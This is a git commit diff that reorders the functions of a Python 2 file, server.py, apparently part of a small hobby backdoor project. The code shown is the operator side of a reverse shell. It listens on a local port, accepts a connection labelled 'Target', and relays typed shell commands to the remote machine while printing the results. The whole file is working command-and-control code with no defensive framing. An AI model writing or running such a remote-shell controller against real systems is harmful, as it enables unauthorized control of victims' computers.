b303a28202ae1810f6c9a053f5e2c04a92774b02
skilfoy <20802814+skilfoy@users.noreply.github.com>
2021-07-10 04:13:37 -0500

    Update server.py

--- server.py
+++ server.py
@@ -2,28 +2,6 @@
 import socket
 import json
 
-def server():
-    global s
-    global ip
-    global target
-    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-    s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
-    s.bind(("127.0.0.1",54321))
-    s.listen(5)
-    print("Listening for incoming connections...")
-    target, ip = s.accept()
-    print("Target Connected!")
-
-def shell():
-    while True:
-        command = raw_input("* Shell~#%s: " % str(ip))
-        reliable_send(command)
-        if command == "q":
-            break
-        else:
-            result = reliable_recv()
-            print(result)
-            
 def reliable_send(data):
     json_data = json.dumps(data)
     target.send(json_data)
@@ -36,8 +14,29 @@ def reliable_recv():
             return json.loads(json_data)
         except ValueError:
             continue
-    
-    
+
+def shell():
+    while True:
+        command = raw_input("* Shell~#%s: " % str(ip))
+        reliable_send(command)
+        if command == "q":
+            break
+        else:
+            result = reliable_recv()
+            print(result)
+            
+def server():
+    global s
+    global ip
+    global target
+    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
+    s.bind(("127.0.0.1",54321))
+    s.listen(5)
+    print("Listening for incoming connections...")
+    target, ip = s.accept()
+    print("Target Connected!")
+            
 server()
 shell()
 s.close()
